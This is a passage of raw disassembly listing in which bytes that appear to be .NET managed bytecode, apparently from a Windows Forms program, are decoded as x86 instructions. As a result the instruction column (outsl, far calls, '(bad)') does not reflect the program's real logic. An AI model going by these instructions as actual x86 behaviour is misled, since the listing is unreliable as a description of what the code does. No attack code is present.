  402577:	0a 06                	or     (%esi),%al
  402579:	16                   	push   %ss
  40257a:	6f                   	outsl  %ds:(%esi),(%dx)
  40257b:	4b                   	dec    %ebx
  40257c:	00 00                	add    %al,(%eax)
  40257e:	0a 06                	or     (%esi),%al
  402580:	09 6f 4c             	or     %ebp,0x4c(%edi)
  402583:	00 00                	add    %al,(%eax)
  402585:	0a 06                	or     (%esi),%al
  402587:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  40258a:	4d                   	dec    %ebp
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 06                	or     (%esi),%al
  40258f:	6f                   	outsl  %ds:(%esi),(%dx)
  402590:	4e                   	dec    %esi
  402591:	00 00                	add    %al,(%eax)
  402593:	0a 13                	or     (%ebx),%dl
  402595:	07                   	pop    %es
  402596:	04 08                	add    $0x8,%al
  402598:	6f                   	outsl  %ds:(%esi),(%dx)
  402599:	4f                   	dec    %edi
  40259a:	00 00                	add    %al,(%eax)
  40259c:	0a 51 11             	or     0x11(%ecx),%dl
  40259f:	07                   	pop    %es
  4025a0:	2a 00                	sub    (%eax),%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	01 10                	add    %edx,(%eax)
  4025a6:	00 00                	add    %al,(%eax)
  4025a8:	00 00                	add    %al,(%eax)
  4025aa:	07                   	pop    %es
  4025ab:	02 17                	add    (%edi),%dl
  4025ad:	1e                   	push   %ds
  4025ae:	02 03                	add    (%ebx),%al
  4025b0:	01 00                	add    %eax,(%eax)
  4025b2:	00 01                	add    %al,(%ecx)
  4025b4:	2a 02                	sub    (%edx),%al
  4025b6:	03 04 16             	add    (%esi,%edx,1),%eax
  4025b9:	28 20                	sub    %ah,(%eax)
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	2a 1e                	sub    (%esi),%bl
  4025c0:	02 28                	add    (%eax),%ch
  4025c2:	11 00                	adc    %eax,(%eax)
  4025c4:	00 0a                	add    %cl,(%edx)
  4025c6:	2a 00                	sub    (%eax),%al
  4025c8:	1b 30                	sbb    (%eax),%esi
  4025ca:	05 00 ed 02 00       	add    $0x2ed00,%eax
  4025cf:	00 06                	add    %al,(%esi)
  4025d1:	00 00                	add    %al,(%eax)
  4025d3:	11 02                	adc    %eax,(%edx)
  4025d5:	2d 02 15 2a 02       	sub    $0x22a1502,%eax
  4025da:	6f                   	outsl  %ds:(%esi),(%dx)
  4025db:	50                   	push   %eax
  4025dc:	00 00                	add    %al,(%eax)
  4025de:	0a 17                	or     (%edi),%dl
  4025e0:	2f                   	das
  4025e1:	02 15 2a 73 18 00    	add    0x18732a,%dl
  4025e7:	00 0a                	add    %cl,(%edx)
  4025e9:	0a 06                	or     (%esi),%al
  4025eb:	22 00                	and    (%eax),%al
  4025ed:	00 c0                	add    %al,%al
  4025ef:	40                   	inc    %eax
  4025f0:	22 00                	and    (%eax),%al
  4025f2:	00 50 41             	add    %dl,0x41(%eax)
  4025f5:	73 2a                	jae    0x402621
  4025f7:	00 00                	add    %al,(%eax)
  4025f9:	0a 6f 2b             	or     0x2b(%edi),%ch
  4025fc:	00 00                	add    %al,(%eax)
  4025fe:	0a 06                	or     (%esi),%al
  402600:	17                   	pop    %ss
  402601:	6f                   	outsl  %ds:(%esi),(%dx)
  402602:	2c 00                	sub    $0x0,%al
  402604:	00 0a                	add    %cl,(%edx)
  402606:	02 6f 50             	add    0x50(%edi),%ch
  402609:	00 00                	add    %al,(%eax)
  40260b:	0a 8d 4c 00 00 01    	or     0x100004c(%ebp),%cl
  402611:	0b 73 51             	or     0x51(%ebx),%esi
  402614:	00 00                	add    %al,(%eax)
  402616:	0a 0c 73             	or     (%ebx,%esi,2),%cl
  402619:	2f                   	das
  40261a:	00 00                	add    %al,(%eax)
  40261c:	0a 0d 1f 13 13 04    	or     0x413131f,%cl
  402622:	16                   	push   %ss
  402623:	13 05 05 28 0d 00    	adc    0xd2805,%eax
  402629:	00 0a                	add    %cl,(%edx)
  40262b:	2d 6e 73 2d 00       	sub    $0x2d736e,%eax
  402630:	00 0a                	add    %cl,(%edx)
  402632:	13 06                	adc    (%esi),%eax
  402634:	11 06                	adc    %eax,(%esi)
  402636:	05 6f 30 00 00       	add    $0x306f,%eax
  40263b:	0a 11                	or     (%ecx),%dl
  40263d:	06                   	push   %es
  40263e:	1f                   	pop    %ds
  40263f:	09 1f                	or     %ebx,(%edi)
  402641:	13 73 31             	adc    0x31(%ebx),%esi
  402644:	00 00                	add    %al,(%eax)
  402646:	0a 6f 32             	or     0x32(%edi),%ch
  402649:	00 00                	add    %al,(%eax)
  40264b:	0a 11                	or     (%ecx),%dl
  40264d:	06                   	push   %es
  40264e:	06                   	push   %es
  40264f:	28 33                	sub    %dh,(%ebx)
  402651:	00 00                	add    %al,(%eax)
  402653:	0a 6f 34             	or     0x34(%edi),%ch
  402656:	00 00                	add    %al,(%eax)
  402658:	0a 13                	or     (%ebx),%dl
  40265a:	0c 12                	or     $0x12,%al
  40265c:	0c 28                	or     $0x28,%al
  40265e:	35 00 00 0a 1b       	xor    $0x1b0a0000,%eax
  402663:	5a                   	pop    %edx
  402664:	1e                   	push   %ds
  402665:	5b                   	pop    %ebx
  402666:	1f                   	pop    %ds
  402667:	12 59 16             	adc    0x16(%ecx),%bl
  40266a:	73 36                	jae    0x4026a2
  40266c:	00 00                	add    %al,(%eax)
  40266e:	0a 6f 37             	or     0x37(%edi),%ch
  402671:	00 00                	add    %al,(%eax)
  402673:	0a 11                	or     (%ecx),%dl
  402675:	06                   	push   %es
  402676:	17                   	pop    %ss
  402677:	6f                   	outsl  %ds:(%esi),(%dx)
  402678:	38 00                	cmp    %al,(%eax)
  40267a:	00 0a                	add    %cl,(%edx)
  40267c:	06                   	push   %es
  40267d:	6f                   	outsl  %ds:(%esi),(%dx)
  40267e:	39 00                	cmp    %eax,(%eax)
  402680:	00 0a                	add    %cl,(%edx)
  402682:	11 06                	adc    %eax,(%esi)
  402684:	6f                   	outsl  %ds:(%esi),(%dx)
  402685:	3a 00                	cmp    (%eax),%al
  402687:	00 0a                	add    %cl,(%edx)
  402689:	11 06                	adc    %eax,(%esi)
  40268b:	6f                   	outsl  %ds:(%esi),(%dx)
  40268c:	3c 00                	cmp    $0x0,%al
  40268e:	00 0a                	add    %cl,(%edx)
  402690:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402693:	06                   	push   %es
  402694:	6f                   	outsl  %ds:(%esi),(%dx)
  402695:	3d 00 00 0a 13       	cmp    $0x130a0000,%eax
  40269a:	05 16 13 07 06       	add    $0x6071316,%eax
  40269f:	28 33                	sub    %dh,(%ebx)
  4026a1:	00 00                	add    %al,(%eax)
  4026a3:	0a 6f 34             	or     0x34(%edi),%ch
  4026a6:	00 00                	add    %al,(%eax)
  4026a8:	0a 13                	or     (%ebx),%dl
  4026aa:	0d 12 0d 28 35       	or     $0x35280d12,%eax
  4026af:	00 00                	add    %al,(%eax)
  4026b1:	0a 1b                	or     (%ebx),%bl
  4026b3:	5a                   	pop    %edx
  4026b4:	1e                   	push   %ds
  4026b5:	5b                   	pop    %ebx
  4026b6:	1f                   	pop    %ds
  4026b7:	12 59 13             	adc    0x13(%ecx),%bl
  4026ba:	08 02                	or     %al,(%edx)
  4026bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4026bd:	52                   	push   %edx
  4026be:	00 00                	add    %al,(%eax)
  4026c0:	0a 13                	or     (%ebx),%dl
  4026c2:	0e                   	push   %cs
  4026c3:	38 ed                	cmp    %ch,%ch
  4026c5:	00 00                	add    %al,(%eax)
  4026c7:	00 11                	add    %dl,(%ecx)
  4026c9:	0e                   	push   %cs
  4026ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4026cb:	53                   	push   %ebx
  4026cc:	00 00                	add    %al,(%eax)
  4026ce:	0a 13                	or     (%ebx),%dl
  4026d0:	09 07                	or     %eax,(%edi)
  4026d2:	11 07                	adc    %eax,(%edi)
  4026d4:	73 54                	jae    0x40272a
  4026d6:	00 00                	add    %al,(%eax)
  4026d8:	0a a2 07 11 07 9a    	or     -0x65f8eef9(%edx),%ah
  4026de:	11 09                	adc    %ecx,(%ecx)
  4026e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4026e1:	55                   	push   %ebp
  4026e2:	00 00                	add    %al,(%eax)
  4026e4:	0a 6f 30             	or     0x30(%edi),%ch
  4026e7:	00 00                	add    %al,(%eax)
  4026e9:	0a 11                	or     (%ecx),%dl
  4026eb:	07                   	pop    %es
  4026ec:	03 33                	add    (%ebx),%esi
  4026ee:	0a 07                	or     (%edi),%al
  4026f0:	11 07                	adc    %eax,(%edi)
  4026f2:	9a 17 6f 56 00 00 0a 	lcall  $0xa00,$0x566f17
  4026f9:	07                   	pop    %es
  4026fa:	11 07                	adc    %eax,(%edi)
  4026fc:	9a 1f 09 11 04 73 31 	lcall  $0x3173,$0x411091f
  402703:	00 00                	add    %al,(%eax)
  402705:	0a 6f 32             	or     0x32(%edi),%ch
  402708:	00 00                	add    %al,(%eax)
  40270a:	0a 07                	or     (%edi),%al
  40270c:	11 07                	adc    %eax,(%edi)
  40270e:	9a 17 6f 38 00 00 0a 	lcall  $0xa00,$0x386f17
  402715:	06                   	push   %es
  402716:	6f                   	outsl  %ds:(%esi),(%dx)
  402717:	39 00                	cmp    %eax,(%eax)
  402719:	00 0a                	add    %cl,(%edx)
  40271b:	07                   	pop    %es
  40271c:	11 07                	adc    %eax,(%edi)
  40271e:	9a 6f 3a 00 00 0a 07 	lcall  $0x70a,$0x3a6f
  402725:	11 07                	adc    %eax,(%edi)
  402727:	9a 6f 57 00 00 0a 11 	lcall  $0x110a,$0x576f
  40272e:	08 31                	or     %dh,(%ecx)
  402730:	3c 07                	cmp    $0x7,%al
  402732:	11 07                	adc    %eax,(%edi)
  402734:	9a 6f 58 00 00 0a 13 	lcall  $0x130a,$0x586f
  40273b:	0a 07                	or     (%edi),%al
  40273d:	11 07                	adc    %eax,(%edi)
  40273f:	9a 11 0a 17 07 11 07 	lcall  $0x711,$0x7170a11
  402746:	9a 6f 57 00 00 0a 17 	lcall  $0x170a,$0x576f
  40274d:	59                   	pop    %ecx
  40274e:	11 08                	adc    %ecx,(%eax)
  402750:	5b                   	pop    %ebx
  402751:	58                   	pop    %eax
  402752:	5a                   	pop    %edx
  402753:	6f                   	outsl  %ds:(%esi),(%dx)
  402754:	59                   	pop    %ecx
  402755:	00 00                	add    %al,(%eax)
  402757:	0a 07                	or     (%edi),%al
  402759:	11 07                	adc    %eax,(%edi)
  40275b:	9a 11 08 6f 5a 00 00 	lcall  $0x0,$0x5a6f0811
  402762:	0a 07                	or     (%edi),%al
  402764:	11 07                	adc    %eax,(%edi)
  402766:	9a 16 6f 38 00 00 0a 	lcall  $0xa00,$0x386f16
  40276d:	07                   	pop    %es
  40276e:	11 07                	adc    %eax,(%edi)
  402770:	9a 6f 3c 00 00 0a 13 	lcall  $0x130a,$0x3c6f
  402777:	04 07                	add    $0x7,%al
  402779:	11 07                	adc    %eax,(%edi)
  40277b:	9a 6f 3d 00 00 0a 11 	lcall  $0x110a,$0x3d6f
  402782:	05 31 0b 07 11       	add    $0x11070b31,%eax
  402787:	07                   	pop    %es
  402788:	9a 6f 3d 00 00 0a 13 	lcall  $0x130a,$0x3d6f
  40278f:	05 11 09 6f 5b       	add    $0x5b6f0911,%eax
  402794:	00 00                	add    %al,(%eax)
  402796:	0a 28                	or     (%eax),%ch
  402798:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  40279d:	11 08                	adc    %ecx,(%eax)
  40279f:	07                   	pop    %es
  4027a0:	11 07                	adc    %eax,(%edi)
  4027a2:	9a 11 09 6f 5b 00 00 	lcall  $0x0,$0x5b6f0911
  4027a9:	0a 6f 5c             	or     0x5c(%edi),%ch
  4027ac:	00 00                	add    %al,(%eax)
  4027ae:	0a 11                	or     (%ecx),%dl
  4027b0:	07                   	pop    %es
  4027b1:	17                   	pop    %ss
  4027b2:	58                   	pop    %eax
  4027b3:	13 07                	adc    (%edi),%eax
  4027b5:	11 0e                	adc    %ecx,(%esi)
  4027b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4027b8:	5d                   	pop    %ebp
  4027b9:	00 00                	add    %al,(%eax)
  4027bb:	0a 3a                	or     (%edx),%bh
  4027bd:	07                   	pop    %es
  4027be:	ff                   	(bad)
  4027bf:	ff                   	(bad)
  4027c0:	ff                   	lcall  (bad)
  4027c1:	de 0c 11             	fimuls (%ecx,%edx,1)
  4027c4:	0e                   	push   %cs
  4027c5:	2c 07                	sub    $0x7,%al
  4027c7:	11 0e                	adc    %ecx,(%esi)
  4027c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4027ca:	5e                   	pop    %esi
  4027cb:	00 00                	add    %al,(%eax)
  4027cd:	0a dc                	or     %ah,%bl
  4027cf:	08 17                	or     %dl,(%edi)
  4027d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4027d2:	5f                   	pop    %edi
  4027d3:	00 00                	add    %al,(%eax)
  4027d5:	0a 09                	or     (%ecx),%cl
  4027d7:	72 47                	jb     0x402820
  4027d9:	00 00                	add    %al,(%eax)
  4027db:	70 6f                	jo     0x40284c
  4027dd:	30 00                	xor    %al,(%eax)
  4027df:	00 0a                	add    %cl,(%edx)
  4027e1:	09 17                	or     %edx,(%edi)
  4027e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4027e4:	40                   	inc    %eax
  4027e5:	00 00                	add    %al,(%eax)
  4027e7:	0a 09                	or     (%ecx),%cl
  4027e9:	1f                   	pop    %ds
  4027ea:	0c 11                	or     $0x11,%al
  4027ec:	05 1f 4d 59 28       	add    $0x28594d1f,%eax
  4027f1:	41                   	inc    %ecx
  4027f2:	00 00                	add    %al,(%eax)
  4027f4:	0a 11                	or     (%ecx),%dl
  4027f6:	04 1f                	add    $0x1f,%al
  4027f8:	24 58                	and    $0x58,%al
  4027fa:	1f                   	pop    %ds
  4027fb:	4b                   	dec    %ebx
  4027fc:	1f                   	pop    %ds
  4027fd:	17                   	pop    %ss
  4027fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4027ff:	3e 00 00             	add    %al,%ds:(%eax)
  402802:	0a 04 28             	or     (%eax,%ebp,1),%al
  402805:	0d 00 00 0a 2c       	or     $0x2c0a0000,%eax
  40280a:	12 06                	adc    (%esi),%al
  40280c:	28 27                	sub    %ah,(%edi)
  40280e:	00 00                	add    %al,(%eax)
  402810:	0a 6f 28             	or     0x28(%edi),%ch
  402813:	00 00                	add    %al,(%eax)
  402815:	0a 6f 30             	or     0x30(%edi),%ch
  402818:	00 00                	add    %al,(%eax)
  40281a:	0a 2b                	or     (%ebx),%ch
  40281c:	07                   	pop    %es
  40281d:	06                   	push   %es
  40281e:	04 6f                	add    $0x6f,%al
  402820:	30 00                	xor    %al,(%eax)
  402822:	00 0a                	add    %cl,(%edx)
  402824:	06                   	push   %es
  402825:	20 b2 00 00 00 11    	and    %dh,0x11000000(%edx)
  40282b:	05 1f 0a 58 28       	add    $0x28580a1f,%eax
  402830:	41                   	inc    %ecx
  402831:	00 00                	add    %al,(%eax)
  402833:	0a 11                	or     (%ecx),%dl
  402835:	04 1f                	add    $0x1f,%al
  402837:	47                   	inc    %edi
  402838:	58                   	pop    %eax
  402839:	73 36                	jae    0x402871
  40283b:	00 00                	add    %al,(%eax)
  40283d:	0a 6f 42             	or     0x42(%edi),%ch
  402840:	00 00                	add    %al,(%eax)
  402842:	0a 06                	or     (%esi),%al
  402844:	6f                   	outsl  %ds:(%esi),(%dx)
  402845:	39 00                	cmp    %eax,(%eax)
  402847:	00 0a                	add    %cl,(%edx)
  402849:	09 6f 3a             	or     %ebp,0x3a(%edi)
  40284c:	00 00                	add    %al,(%eax)
  40284e:	0a 06                	or     (%esi),%al
  402850:	19 6f 44             	sbb    %ebp,0x44(%edi)
  402853:	00 00                	add    %al,(%eax)
  402855:	0a 06                	or     (%esi),%al
  402857:	17                   	pop    %ss
  402858:	6f                   	outsl  %ds:(%esi),(%dx)
  402859:	45                   	inc    %ebp
  40285a:	00 00                	add    %al,(%eax)
  40285c:	0a 06                	or     (%esi),%al
  40285e:	28 46 00             	sub    %al,0x0(%esi)
  402861:	00 0a                	add    %cl,(%edx)
  402863:	6f                   	outsl  %ds:(%esi),(%dx)
  402864:	47                   	inc    %edi
  402865:	00 00                	add    %al,(%eax)
  402867:	0a 28                	or     (%eax),%ch
  402869:	48                   	dec    %eax
  40286a:	00 00                	add    %al,(%eax)
  40286c:	0a 6f 49             	or     0x49(%edi),%ch
  40286f:	00 00                	add    %al,(%eax)
  402871:	0a de                	or     %dh,%bl
  402873:	03 26                	add    (%esi),%esp
  402875:	de 00                	fiadds (%eax)
  402877:	06                   	push   %es
  402878:	16                   	push   %ss
  402879:	6f                   	outsl  %ds:(%esi),(%dx)
  40287a:	4a                   	dec    %edx
  40287b:	00 00                	add    %al,(%eax)
  40287d:	0a 06                	or     (%esi),%al
  40287f:	16                   	push   %ss
  402880:	6f                   	outsl  %ds:(%esi),(%dx)
  402881:	4b                   	dec    %ebx
  402882:	00 00                	add    %al,(%eax)
  402884:	0a 06                	or     (%esi),%al
  402886:	09 6f 4c             	or     %ebp,0x4c(%edi)
  402889:	00 00                	add    %al,(%eax)
  40288b:	0a 06                	or     (%esi),%al
  40288d:	6f                   	outsl  %ds:(%esi),(%dx)
  40288e:	4e                   	dec    %esi
  40288f:	00 00                	add    %al,(%eax)
  402891:	0a 17                	or     (%edi),%dl
  402893:	33 2a                	xor    (%edx),%ebp
  402895:	15 13 0b 16 13       	adc    $0x13160b13,%eax
  40289a:	07                   	pop    %es
  40289b:	2b 15 07 11 07 9a    	sub    0x9a071107,%edx
  4028a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4028a2:	60                   	pusha
  4028a3:	00 00                	add    %al,(%eax)
  4028a5:	0a 2c 04             	or     (%esp,%eax,1),%ch
  4028a8:	11 07                	adc    %eax,(%edi)
  4028aa:	13 0b                	adc    (%ebx),%ecx
  4028ac:	11 07                	adc    %eax,(%edi)
  4028ae:	17                   	pop    %ss
  4028af:	58                   	pop    %eax
  4028b0:	13 07                	adc    (%edi),%eax
  4028b2:	11 07                	adc    %eax,(%edi)
  4028b4:	02 6f 50             	add    0x50(%edi),%ch
  4028b7:	00 00                	add    %al,(%eax)
  4028b9:	0a 32                	or     (%edx),%dh
  4028bb:	e1 11                	loope  0x4028ce
  4028bd:	0b 2a                	or     (%edx),%ebp
  4028bf:	15 2a 00 00 00       	adc    $0x2a,%eax
  4028c4:	41                   	inc    %ecx
  4028c5:	34 00                	xor    $0x0,%al
  4028c7:	00 02                	add    %al,(%edx)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 ef                	add    %ch,%bh
  4028cd:	00 00                	add    %al,(%eax)
  4028cf:	00 00                	add    %al,(%eax)
  4028d1:	01 00                	add    %eax,(%eax)
  4028d3:	00 ef                	add    %ch,%bh
  4028d5:	01 00                	add    %eax,(%eax)
  4028d7:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  4028e2:	00 00                	add    %al,(%eax)
  4028e4:	89 02                	mov    %eax,(%edx)
  4028e6:	00 00                	add    %al,(%eax)
  4028e8:	17                   	pop    %ss
  4028e9:	00 00                	add    %al,(%eax)
  4028eb:	00 a0 02 00 00 03    	add    %ah,0x3000002(%eax)
  4028f1:	00 00                	add    %al,(%eax)
  4028f3:	00 01                	add    %al,(%ecx)
  4028f5:	00 00                	add    %al,(%eax)
  4028f7:	01 1e                	add    %ebx,(%esi)
  4028f9:	02 28                	add    (%eax),%ch
  4028fb:	11 00                	adc    %eax,(%eax)
  4028fd:	00 0a                	add    %cl,(%edx)
  4028ff:	2a 13                	sub    (%ebx),%dl
  402901:	30 06                	xor    %al,(%esi)
  402903:	00 50 00             	add    %dl,0x0(%eax)
  402906:	00 00                	add    %al,(%eax)
  402908:	07                   	pop    %es
  402909:	00 00                	add    %al,(%eax)
  40290b:	11 1f                	adc    %ebx,(%edi)
  40290d:	40                   	inc    %eax
  40290e:	73 61                	jae    0x402971
  402910:	00 00                	add    %al,(%eax)
  402912:	0a 0a                	or     (%edx),%cl
  402914:	20 00                	and    %al,(%eax)
  402916:	01 00                	add    %eax,(%eax)
  402918:	00 8d 51 00 00 01    	add    %cl,0x1000051(%ebp)
  40291e:	0b 03                	or     (%ebx),%eax
  402920:	2c 09                	sub    $0x9,%al
  402922:	07                   	pop    %es
  402923:	1f                   	pop    %ds
  402924:	10 20                	adc    %ah,(%eax)
  402926:	ff 00                	incl   (%eax)
  402928:	00 00                	add    %al,(%eax)
  40292a:	9c                   	pushf
  40292b:	04 2c                	add    $0x2c,%al
  40292d:	12 07                	adc    (%edi),%al
  40292f:	1f                   	pop    %ds
  402930:	11 20                	adc    %esp,(%eax)
  402932:	ff 00                	incl   (%eax)
  402934:	00 00                	add    %al,(%eax)
  402936:	9c                   	pushf
  402937:	07                   	pop    %es
  402938:	1f                   	pop    %ds
  402939:	12 20                	adc    (%eax),%ah
  40293b:	ff 00                	incl   (%eax)
  40293d:	00 00                	add    %al,(%eax)
  40293f:	9c                   	pushf
  402940:	02 16                	add    (%esi),%dl
  402942:	07                   	pop    %es
  402943:	06                   	push   %es
  402944:	1f                   	pop    %ds
  402945:	40                   	inc    %eax
  402946:	16                   	push   %ss
  402947:	28 25 00 00 06 17    	sub    %ah,0x17060000
  40294d:	32 07                	xor    (%edi),%al
  40294f:	06                   	push   %es
  402950:	6f                   	outsl  %ds:(%esi),(%dx)
  402951:	10 00                	adc    %al,(%eax)
  402953:	00 0a                	add    %cl,(%edx)
  402955:	2a 72 5b             	sub    0x5b(%edx),%dh
  402958:	00 00                	add    %al,(%eax)
  40295a:	70 2a                	jo     0x402986
  40295c:	1b 30                	sbb    (%eax),%esi
  40295e:	04 00                	add    $0x0,%al
  402960:	03 01                	add    (%ecx),%eax
  402962:	00 00                	add    %al,(%eax)
  402964:	08 00                	or     %al,(%eax)
  402966:	00 11                	add    %dl,(%ecx)
  402968:	73 29                	jae    0x402993
  40296a:	00 00                	add    %al,(%eax)
  40296c:	06                   	push   %es
  40296d:	0a 73 2d             	or     0x2d(%ebx),%dh
  402970:	00 00                	add    %al,(%eax)
  402972:	0a 0b                	or     (%ebx),%cl
  402974:	03 28                	add    (%eax),%ebp
  402976:	0d 00 00 0a 2c       	or     $0x2c0a0000,%eax
  40297b:	0d 07 72 5f 00       	or     $0x5f7207,%eax
  402980:	00 70 6f             	add    %dh,0x6f(%eax)
  402983:	30 00                	xor    %al,(%eax)
  402985:	00 0a                	add    %cl,(%edx)
  402987:	2b 07                	sub    (%edi),%eax
  402989:	07                   	pop    %es
  40298a:	03 6f 30             	add    0x30(%edi),%ebp
  40298d:	00 00                	add    %al,(%eax)
  40298f:	0a 07                	or     (%edi),%al
  402991:	1f                   	pop    %ds
  402992:	09 1f                	or     %ebx,(%edi)
  402994:	13 73 31             	adc    0x31(%ebx),%esi
  402997:	00 00                	add    %al,(%eax)
  402999:	0a 6f 32             	or     0x32(%edi),%ch
  40299c:	00 00                	add    %al,(%eax)
  40299e:	0a 07                	or     (%edi),%al
  4029a0:	06                   	push   %es
  4029a1:	28 33                	sub    %dh,(%ebx)
  4029a3:	00 00                	add    %al,(%eax)
  4029a5:	0a 6f 34             	or     0x34(%edi),%ch
  4029a8:	00 00                	add    %al,(%eax)
  4029aa:	0a 0c 12             	or     (%edx,%edx,1),%cl
  4029ad:	02 28                	add    (%eax),%ch
  4029af:	35 00 00 0a 1b       	xor    $0x1b0a0000,%eax
  4029b4:	5a                   	pop    %edx
  4029b5:	1e                   	push   %ds
  4029b6:	5b                   	pop    %ebx
  4029b7:	1f                   	pop    %ds
  4029b8:	12 59 16             	adc    0x16(%ecx),%bl
  4029bb:	73 36                	jae    0x4029f3
  4029bd:	00 00                	add    %al,(%eax)
  4029bf:	0a 6f 37             	or     0x37(%edi),%ch
  4029c2:	00 00                	add    %al,(%eax)
  4029c4:	0a 07                	or     (%edi),%al
  4029c6:	17                   	pop    %ss
  4029c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c8:	38 00                	cmp    %al,(%eax)
  4029ca:	00 0a                	add    %cl,(%edx)
  4029cc:	06                   	push   %es
  4029cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4029ce:	39 00                	cmp    %eax,(%eax)
  4029d0:	00 0a                	add    %cl,(%edx)
  4029d2:	07                   	pop    %es
  4029d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4029d4:	3a 00                	cmp    (%eax),%al
  4029d6:	00 0a                	add    %cl,(%edx)
  4029d8:	02 28                	add    (%eax),%ch
  4029da:	0d 00 00 0a 2c       	or     $0x2c0a0000,%eax
  4029df:	12 06                	adc    (%esi),%al
  4029e1:	28 27                	sub    %ah,(%edi)
  4029e3:	00 00                	add    %al,(%eax)
  4029e5:	0a 6f 28             	or     0x28(%edi),%ch
  4029e8:	00 00                	add    %al,(%eax)
  4029ea:	0a 6f 30             	or     0x30(%edi),%ch
  4029ed:	00 00                	add    %al,(%eax)
  4029ef:	0a 2b                	or     (%ebx),%ch
  4029f1:	07                   	pop    %es
  4029f2:	06                   	push   %es
  4029f3:	02 6f 30             	add    0x30(%edi),%ch
  4029f6:	00 00                	add    %al,(%eax)
  4029f8:	0a 06                	or     (%esi),%al
  4029fa:	20 b2 00 00 00 07    	and    %dh,0x7000000(%edx)
  402a00:	6f                   	outsl  %ds:(%esi),(%dx)
  402a01:	3d 00 00 0a 1f       	cmp    $0x1f0a0000,%eax
  402a06:	0a 58 28             	or     0x28(%eax),%bl
  402a09:	41                   	inc    %ecx
  402a0a:	00 00                	add    %al,(%eax)
  402a0c:	0a 07                	or     (%edi),%al
  402a0e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a0f:	3c 00                	cmp    $0x0,%al
  402a11:	00 0a                	add    %cl,(%edx)
  402a13:	1f                   	pop    %ds
  402a14:	37                   	aaa
  402a15:	58                   	pop    %eax
  402a16:	73 36                	jae    0x402a4e
  402a18:	00 00                	add    %al,(%eax)
  402a1a:	0a 6f 42             	or     0x42(%edi),%ch
  402a1d:	00 00                	add    %al,(%eax)
  402a1f:	0a 06                	or     (%esi),%al
  402a21:	19 6f 44             	sbb    %ebp,0x44(%edi)
  402a24:	00 00                	add    %al,(%eax)
  402a26:	0a 06                	or     (%esi),%al
  402a28:	17                   	pop    %ss
  402a29:	6f                   	outsl  %ds:(%esi),(%dx)
  402a2a:	45                   	inc    %ebp
  402a2b:	00 00                	add    %al,(%eax)
  402a2d:	0a 06                	or     (%esi),%al
  402a2f:	28 46 00             	sub    %al,0x0(%esi)
  402a32:	00 0a                	add    %cl,(%edx)
  402a34:	6f                   	outsl  %ds:(%esi),(%dx)
  402a35:	47                   	inc    %edi
  402a36:	00 00                	add    %al,(%eax)
  402a38:	0a 28                	or     (%eax),%ch
  402a3a:	48                   	dec    %eax
  402a3b:	00 00                	add    %al,(%eax)
  402a3d:	0a 6f 49             	or     0x49(%edi),%ch
  402a40:	00 00                	add    %al,(%eax)
  402a42:	0a de                	or     %dh,%bl
  402a44:	03 26                	add    (%esi),%esp
  402a46:	de 00                	fiadds (%eax)
  402a48:	06                   	push   %es
  402a49:	16                   	push   %ss
  402a4a:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4b:	4a                   	dec    %edx
  402a4c:	00 00                	add    %al,(%eax)
  402a4e:	0a 06                	or     (%esi),%al
  402a50:	16                   	push   %ss
  402a51:	6f                   	outsl  %ds:(%esi),(%dx)
  402a52:	4b                   	dec    %ebx
  402a53:	00 00                	add    %al,(%eax)
  402a55:	0a 06                	or     (%esi),%al
  402a57:	04 7d                	add    $0x7d,%al
  402a59:	27                   	daa
  402a5a:	00 00                	add    %al,(%eax)
  402a5c:	04 06                	add    $0x6,%al
  402a5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a5f:	4e                   	dec    %esi
  402a60:	00 00                	add    %al,(%eax)
  402a62:	0a 26                	or     (%esi),%ah
  402a64:	06                   	push   %es
  402a65:	7b 28                	jnp    0x402a8f
  402a67:	00 00                	add    %al,(%eax)
  402a69:	04 2a                	add    $0x2a,%al
  402a6b:	00 01                	add    %al,(%ecx)
  402a6d:	10 00                	adc    %al,(%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 c6                	add    %al,%dh
  402a73:	00 17                	add    %dl,(%edi)
  402a75:	dd 00                	fldl   (%eax)
  402a77:	03 01                	add    (%ecx),%eax
  402a79:	00 00                	add    %al,(%eax)
  402a7b:	01 1e                	add    %ebx,(%esi)
  402a7d:	02 28                	add    (%eax),%ch
  402a7f:	11 00                	adc    %eax,(%eax)
  402a81:	00 0a                	add    %cl,(%edx)
  402a83:	2a 03                	sub    (%ebx),%al
  402a85:	30 03                	xor    %al,(%ebx)
  402a87:	00 4e 00             	add    %cl,0x0(%esi)
  402a8a:	00 00                	add    %al,(%eax)
  402a8c:	00 00                	add    %al,(%eax)
  402a8e:	00 00                	add    %al,(%eax)
  402a90:	02 17                	add    (%edi),%dl
  402a92:	7d 27                	jge    0x402abb
  402a94:	00 00                	add    %al,(%eax)
  402a96:	04 02                	add    $0x2,%al
  402a98:	28 18                	sub    %bl,(%eax)
  402a9a:	00 00                	add    %al,(%eax)
  402a9c:	0a 02                	or     (%edx),%al
  402a9e:	22 00                	and    (%eax),%al
  402aa0:	00 c0                	add    %al,%al
  402aa2:	40                   	inc    %eax
  402aa3:	22 00                	and    (%eax),%al
  402aa5:	00 50 41             	add    %dl,0x41(%eax)
  402aa8:	73 2a                	jae    0x402ad4
  402aaa:	00 00                	add    %al,(%eax)
  402aac:	0a 28                	or     (%eax),%ch
  402aae:	2b 00                	sub    (%eax),%eax
